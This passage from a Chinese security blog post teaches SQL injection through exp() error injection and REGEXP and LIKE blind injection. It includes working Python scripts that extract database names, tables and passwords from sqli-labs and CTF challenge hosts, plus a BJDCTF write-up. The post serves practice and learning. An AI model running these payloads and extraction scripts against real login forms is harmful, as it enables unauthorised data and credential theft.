<span class="hljs-keyword">def</span> <span class="hljs-title function_">str2hex</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):
    result = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:
        result += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))
    result = result.replace(<span class="hljs-string">'0x'</span>, <span class="hljs-string">''</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-string">'0x'</span> + result

strs = string.ascii_letters + string.digits + <span class="hljs-string">'_'</span>
url = <span class="hljs-string">'http://690399e6-ab28-459d-ab40-789da08843fb.node4.buuoj.cn:81/login.php'</span>
headers = {
    <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0'</span>
}

payload = <span class="hljs-string">'||exp(710-(code rlike binary {0}))#'</span>
tmp = <span class="hljs-string">'^'</span>
name = <span class="hljs-string">''</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">40</span>):
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strs:
        passwd = str2hex(tmp + j)
        payloads = payload.<span class="hljs-built_in">format</span>(passwd).replace(<span class="hljs-string">' '</span>, <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0c</span>))
        data = {
            <span class="hljs-string">'username'</span>: <span class="hljs-string">'\\'</span>,
            <span class="hljs-string">'password'</span>: payloads,
            <span class="hljs-string">'code'</span>: <span class="hljs-string">'1'</span>
        }
        req = requests.post(url, data = data, allow_redirects=<span class="hljs-literal">False</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-string">'fail'</span> <span class="hljs-keyword">in</span> req.text:
            name += j
            <span class="hljs-built_in">print</span>(tmp + j, name)
            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tmp) == <span class="hljs-number">3</span>:
                tmp = tmp[<span class="hljs-number">1</span>:] + j
            <span class="hljs-keyword">else</span>:
                tmp += j
            <span class="hljs-keyword">break</span>

tmp = <span class="hljs-string">'$'</span>
name = <span class="hljs-string">''</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">40</span>):
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strs:
        passwd = str2hex(j + tmp)
        payloads = payload.<span class="hljs-built_in">format</span>(passwd).replace(<span class="hljs-string">' '</span>, <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0c</span>))
        data = {
            <span class="hljs-string">'username'</span>: <span class="hljs-string">'\\'</span>,
            <span class="hljs-string">'password'</span>: payloads,
            <span class="hljs-string">'code'</span>: <span class="hljs-string">'1'</span>
        }
        req = requests.post(url, data = data, allow_redirects=<span class="hljs-literal">False</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-string">'fail'</span> <span class="hljs-keyword">in</span> req.text:
            name = j + name
            <span class="hljs-built_in">print</span>(j + tmp, name)
            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tmp) == <span class="hljs-number">3</span>:
                tmp = j + tmp[:-<span class="hljs-number">1</span>]
            <span class="hljs-keyword">else</span>:
                tmp = j + tmp
            <span class="hljs-keyword">break</span>

data = {
            <span class="hljs-string">'username'</span>: <span class="hljs-string">'\\'</span>,
            <span class="hljs-string">'password'</span>: <span class="hljs-string">'||1#'</span>,
            <span class="hljs-string">'code'</span>: <span class="hljs-string">'erghruigh2uygh23uiu32ig'</span>
        }

req = requests.post(url, data=data)
<span class="hljs-built_in">print</span>(req.text)</code></pre>
<p>完整代码如上，不过我自己在编写完成后，发现从后面开始匹配的方法，有一定几率一次成功。</p>
<h1 id="0x04-regexp与like注入">0x04 REGEXP与LIKE注入</h1>
<p>这里质量低下，知识点基本都是照搬的，有的只是自己的思考和实操罢了</p>
<h2 id="regexp注入分析">REGEXP注入分析</h2>
<p><strong>注入原理</strong></p>
<p>REGEXP注入，即regexp正则表达式注入。REGEXP注入，又叫盲注值正则表达式攻击。应用场景就是盲注，原理是直接查询自己需要的数据，然后通过正则表达式进行匹配。</p>
<h3 id="1-基本注入">1、基本注入</h3>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span>语句) regexp <span class="hljs-string">'正则'</span></code></pre>
<p>正常的查询语句：</p>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;</code></pre>
<p>（1）正则注入，若匹配则返回1，不匹配返回0</p>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>) regexp <span class="hljs-string">'^a'</span>;</code></pre>
<pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;
<span class="hljs-operator">+</span><span class="hljs-comment">----------+</span>
<span class="hljs-operator">|</span> username <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">----------+</span>
<span class="hljs-operator">|</span> Dumb     <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">----------+</span>
<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.11</span> sec)

mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span>(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>) regexp <span class="hljs-string">'^D'</span>;
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------+</span>
<span class="hljs-operator">|</span> (<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>) regexp <span class="hljs-string">'^D'</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------+</span>
<span class="hljs-operator">|</span>                                                   <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------+</span>
<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.04</span> sec)

mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span>(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>) regexp <span class="hljs-string">'^a'</span>;
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------+</span>
<span class="hljs-operator">|</span> (<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>) regexp <span class="hljs-string">'^a'</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------+</span>
<span class="hljs-operator">|</span>                                                   <span class="hljs-number">0</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------+</span>
<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.04</span> sec)</code></pre>
<p><code>^</code>表示pattern(模式串)的开头。即若匹配到username字段下id=1的数据开头为a，则返回1；否则返回0</p>
<p>（2）regexp关键字还可以代替where条件里的=号</p>
<pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> password <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;
<span class="hljs-operator">+</span><span class="hljs-comment">----------+</span>
<span class="hljs-operator">|</span> password <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">----------+</span>
<span class="hljs-operator">|</span> Dumb     <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">----------+</span>
<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.05</span> sec)

mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> password regexp <span class="hljs-string">'^Du'</span>;
<span class="hljs-operator">+</span><span class="hljs-comment">----+----------+----------+</span>
<span class="hljs-operator">|</span> id <span class="hljs-operator">|</span> username <span class="hljs-operator">|</span> password <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">----+----------+----------+</span>
<span class="hljs-operator">|</span>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Dumb     <span class="hljs-operator">|</span> Dumb     <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-number">12</span> <span class="hljs-operator">|</span> dhakkan  <span class="hljs-operator">|</span> dumbo    <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">----+----------+----------+</span>
<span class="hljs-number">2</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.04</span> sec)</code></pre>
<p>使用场景：</p>
<blockquote>
<p>过滤了=、in、like</p>
</blockquote>
<p><code>^</code>若被过滤，可使用<code>$</code>来从后往前进行匹配（深有感悟啊~~），常用regexp正则语句：</p>
<pre><code class="hljs sql">regexp <span class="hljs-string">'^[a-z]'</span>  #判断一个表的第一个字符串是否在a<span class="hljs-operator">-</span>z中
regexp <span class="hljs-string">'^r'</span>      #判断第一个字符串是否为r
regexp <span class="hljs-string">'^r[a-z]'</span> #判断一个表的第二个字符串是否在a<span class="hljs-operator">-</span>z中</code></pre>
<p>（3）在联合查询中的使用</p>
<pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database() regexp <span class="hljs-string">'^s'</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215205452658.png" alt="image-20231215205452658"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215205541822.png" alt="image-20231215205541822"></p>
<p>上述password处只会显示1或者0，这样就能知道我们的regexp是否匹配成功。</p>
<h3 id="2-regexp盲注">2、REGEXP盲注</h3>
<p>在sqli-labs靶场Less-8关进行测试</p>
<p><strong>1.判断数据库长度</strong></p>
<pre><code class="hljs sql"><span class="hljs-string">' or (length(database())=8)--+ 正常</span></code></pre>
<p><strong>2.判断数据库名</strong></p>
<pre><code class="hljs sql"><span class="hljs-string">' or database() regexp '</span><span class="hljs-operator">^</span>s<span class="hljs-string">'--+ 正常</span>
<span class="hljs-string">'</span> <span class="hljs-keyword">or</span> database() regexp <span class="hljs-string">'y$'</span><span class="hljs-comment">--+ 正常</span></code></pre>
<p>表名、字段名、数据内容不再赘述。很明显和普通的布尔盲注差不多，附上大师傅的脚本：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> string

strs = string.printable
url = <span class="hljs-string">"http://x.x.x.x:8001/Less-8/index.php?id="</span>

database1 = <span class="hljs-string">"' or database() regexp '^{}'--+"</span>
table1 = <span class="hljs-string">"' or (select table_name from information_schema.tables where table_schema=database() limit 0,1) regexp '^{}'--+"</span>
cloumn1 = <span class="hljs-string">"' or (select column_name from information_schema.columns where table_name=\"users\" and table_schema=database() limit 1,1) regexp '^{}'--+"</span>
data1 = <span class="hljs-string">"' or (select username from users limit 0,1) regexp '^{}'--+"</span>

payload = database1
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    name = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">40</span>):
        char = <span class="hljs-string">''</span>
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strs:
            payloads = payload.<span class="hljs-built_in">format</span>(name+j)
            urls = url+payloads
            r = requests.get(urls)
            <span class="hljs-keyword">if</span> <span class="hljs-string">"You are in"</span> <span class="hljs-keyword">in</span> r.text:
                name += j
                <span class="hljs-built_in">print</span>(j,end=<span class="hljs-string">''</span>)
                char = j
                <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">if</span> char ==<span class="hljs-string">'#'</span>:
            <span class="hljs-keyword">break</span></code></pre>
<h2 id="like注入分析">LIKE注入分析</h2>
<p><strong>like匹配</strong></p>
<p>百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线<code>_</code>通配符允许匹配任何单个字符。</p>
<h3 id="1-基本注入">1、基本注入</h3>
<p><strong>1.<code>like 's%'</code>判断第一个字符是否为s</strong></p>
<pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database() <span class="hljs-keyword">like</span> <span class="hljs-string">'s%'</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre>
<p><strong>2.<code>like 'se%'</code>判断前面两个字符串是否为se</strong></p>
<pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database() <span class="hljs-keyword">like</span> <span class="hljs-string">'se%'</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre>
<p><strong>3.<code>like '%se%'</code> 判断是否包含se两个字符串</strong>  --不过测试下来发现待测字符的开头一定要为正确的，否则页面一直返回0，也就是无法匹配类似<code>%ecu%</code>这类字符</p>
<pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database() <span class="hljs-keyword">like</span> <span class="hljs-string">'%se%'</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre>
<p>4.<code>like '_____'</code>判断是否为5个字符</p>
<pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database() <span class="hljs-keyword">like</span> <span class="hljs-string">'_____'</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre>
<p>5.<code>like 's____'</code> 判断第一个字符是否为s</p>
<pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database() <span class="hljs-keyword">like</span> <span class="hljs-string">'s____'</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215210444287.png" alt="image-20231215210444287"></p>
<h3 id="2-like盲注">2、LIKE盲注</h3>
<p>依旧在sqli-labs靶场Less-8关进行测试</p>
<p><strong>1.判断数据库长度</strong><br>
可用length()函数，也可用<code>_</code>，如：</p>
<pre><code class="hljs sql"><span class="hljs-string">' or database() like '</span>________<span class="hljs-string">'--+</span></code></pre>
<p><strong>2.判断数据库名</strong></p>
<pre><code class="hljs sql"><span class="hljs-string">' or database() like '</span>s<span class="hljs-operator">%</span><span class="hljs-string">'--+</span>
<span class="hljs-string">也可用</span>
<span class="hljs-string">'</span> <span class="hljs-keyword">or</span> database() <span class="hljs-keyword">like</span> <span class="hljs-string">'s_______'</span><span class="hljs-comment">--+</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215210703023.png" alt="image-20231215210703023"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215210719431.png" alt="image-20231215210719431"></p>
<p>说明数据库名的第一个字符是s。数据表、字段、数据类似，把REGEXP盲注脚本改一下，于是成了LIKE盲注脚本：</p>
<pre><code class="hljs sql">import requests
import string

strs <span class="hljs-operator">=</span> string.printable
url <span class="hljs-operator">=</span> "http://x.x.x.x:8001/Less-8/index.php?id="

database1 <span class="hljs-operator">=</span> "' or database() like '{}%'--+"
table1 <span class="hljs-operator">=</span> "' or (select table_name from information_schema.tables where table_schema=database() limit 0,1) like '{}%'--+"
cloumn1 <span class="hljs-operator">=</span> "' or (select column_name from information_schema.columns where table_name=\"users\" and table_schema=database() limit 1,1) like '{}%'--+"
data1 <span class="hljs-operator">=</span> "' or (select username from users limit 0,1) like '{}%'--+"

payload <span class="hljs-operator">=</span> database1
if __name__ <span class="hljs-operator">=</span><span class="hljs-operator">=</span> "__main__":
    name <span class="hljs-operator">=</span> <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-keyword">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">40</span>):
        <span class="hljs-type">char</span> <span class="hljs-operator">=</span> <span class="hljs-string">''</span>
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strs:
            payloads <span class="hljs-operator">=</span> payload.format(name<span class="hljs-operator">+</span>j)
            urls <span class="hljs-operator">=</span> url<span class="hljs-operator">+</span>payloads
            r <span class="hljs-operator">=</span> requests.get(urls)
            if "You are in" <span class="hljs-keyword">in</span> r.text:
                name <span class="hljs-operator">+</span><span class="hljs-operator">=</span> j
                print(j,<span class="hljs-keyword">end</span><span class="hljs-operator">=</span><span class="hljs-string">''</span>)
                <span class="hljs-type">char</span> <span class="hljs-operator">=</span> j
                break
        if <span class="hljs-type">char</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-string">'#'</span>:
            break</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215210857723.png" alt="image-20231215210857723"></p>
<h3 id="3-regexp注入实战">3、REGEXP注入实战</h3>
<h4 id="bjdctf-2nd-简单注入">BJDCTF 2nd 简单注入</h4>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215213109014.png" alt="image-20231215213109014"></p>
<p>发现提示</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215213135245.png" alt="image-20231215213135245"></p>
<p>这里给出了sql语句</p>
<pre><code class="hljs sql"><span class="hljs-keyword">Only</span> u input the correct password <span class="hljs-keyword">then</span> u can <span class="hljs-keyword">get</span> the flag
<span class="hljs-keyword">and</span> p3rh4ps wants a girl friend.

<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">'$_POST["username"]'</span> <span class="hljs-keyword">and</span> password<span class="hljs-operator">=</span><span class="hljs-string">'$_POST["password"]'</span>;</code></pre>
<p>很明显又是相同的套路，我们进行如下赋值：</p>
<pre><code class="hljs sql">username<span class="hljs-operator">=</span>haha\
password<span class="hljs-operator">=</span><span class="hljs-string">'or 1#'</span>

<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">'(haha\'</span> <span class="hljs-keyword">and</span> password<span class="hljs-operator">=</span><span class="hljs-string">')or 1#'</span>; #括号只是一个提示作用</code></pre>
<p>简单fuzz一下看一下过滤情况：</p>
<pre><code class="hljs plaintext">过滤的有：select、union、'、=、like等等</code></pre>
<p>但是没过滤regexp</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215213832727.png" alt="image-20231215213832727"></p>
<p>如上图发现页面有变化，接下来进一步测试</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215214058299.png" alt="image-20231215214058299"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215214043397.png" alt="image-20231215214043397"></p>
<p>发现页面回显不一致，但始终只有这两条信息，这意味着我们需要进行盲注了，直接上脚本，这里我先尝试自己写一番</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> string

<span class="hljs-keyword">def</span> <span class="hljs-title function_">str2hex</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):
    result = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:
        result += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))
    result = result.replace(<span class="hljs-string">'0x'</span>, <span class="hljs-string">''</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-string">'0x'</span> + result


strs = string.ascii_letters + string.digits
url = <span class="hljs-string">"http://f973c801-88f4-44ee-9a5c-ec1911041314.node4.buuoj.cn:81/"</span>
payload = <span class="hljs-string">'or password regexp binary {}#'</span>
headers = {
    <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0'</span>
}

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    name = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">40</span>):
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strs:
            passwd = str2hex(<span class="hljs-string">'^'</span> + name + j)
            payloads = payload.<span class="hljs-built_in">format</span>(passwd)
            data = {
                <span class="hljs-string">'username'</span>: <span class="hljs-string">'admin\\'</span>,
                <span class="hljs-string">'password'</span>: payloads
            }
            r = requests.post(url, data=data,headers=headers)
            <span class="hljs-keyword">if</span> <span class="hljs-string">"BJD needs"</span> <span class="hljs-keyword">in</span> r.text:
                name += j
                <span class="hljs-built_in">print</span>(j,end=<span class="hljs-string">''</span>)
                <span class="hljs-keyword">break</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215215446707.png" alt="image-20231215215446707"></p>
<p>成功得到密码，我们登录即可得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215215519726.png" alt="image-20231215215519726"></p>
<h1 id="0x05-后言">0x05 后言</h1>
<p>本次对于报错注入的学习有些许深刻，日后会随缘更新补充本文，希望可以对报错注入有一个完全的掌握。</p>
<h1 id="0x06-参考文章">0x06 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ssslq/article/details/129285751">SQL报错注入（下）</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9849#toc-3">如何使用 MySQL exp() 函数进行 Sql 注入</a></p>
<p><a target="_blank" rel="noopener" href="https://lorexxar.cn/2015/11/19/sql-error/#more">SQL 显错注入</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_55793759/article/details/127078074">2021-虎符网络安全赛道-hatenum | exp()函数与正则过滤</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.z3ratu1.top/%5BHFCTF2021%5Dhatenum.html">[HFCTF2021]hatenum</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8003#toc-7">REGEXP注入与LIKE注入学习笔记</a></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/')">再探SQL报错注入</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=再探SQL报错注入&amp;url=http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>基本知识<span class="tagsPageCount">21</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/12/14/pentesterlab-xi-lie/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div 